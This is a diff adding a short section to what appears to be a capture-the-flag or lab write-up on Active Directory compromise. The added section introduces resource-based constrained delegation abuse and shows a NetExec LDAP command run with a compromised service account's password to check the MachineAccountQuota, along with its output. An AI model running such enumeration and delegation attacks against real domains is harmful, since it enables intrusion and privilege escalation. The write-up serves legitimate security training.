@@ -657,3 +657,15 @@ This user is now compromised, so now ill look at abusing RBCD
 
 # Resource Based Constrained Delegation (RBCD)
 
+https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd
+
+```python
+nxc ldap dc.phantom.vl -u svc_sspr -p 'gB6XTcqVP5MlP7Rc' -M maq
+LDAP        10.129.234.63   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:phantom.vl) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.129.234.63   389    DC               [+] phantom.vl\svc_sspr:gB6XTcqVP5MlP7Rc 
+MAQ         10.129.234.63   389    DC               [*] Getting the MachineAccountQuota
+MAQ         10.129.234.63   389    DC               MachineAccountQuota: 0
+```
+
+In this example, i dont have the ability to add a machine account nor have i compromised a machine account
+
